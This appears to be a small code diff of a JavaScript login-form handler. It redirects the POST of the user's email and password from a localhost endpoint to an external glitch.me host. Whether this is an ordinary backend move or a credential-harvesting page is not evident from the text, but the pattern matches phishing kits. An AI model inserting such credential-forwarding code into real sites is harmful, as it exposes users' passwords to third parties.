@@ -5,7 +5,7 @@ document.getElementById("login-form").addEventListener("submit", function(e) {
     const password = document.getElementById("erf_password").value;
 
     // Отправка данных на сервер
-    fetch('http://localhost:3000/submit', {  
+    fetch('https://scrawny-silky-lyric.glitch.me/submit', {  
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ email, password })  
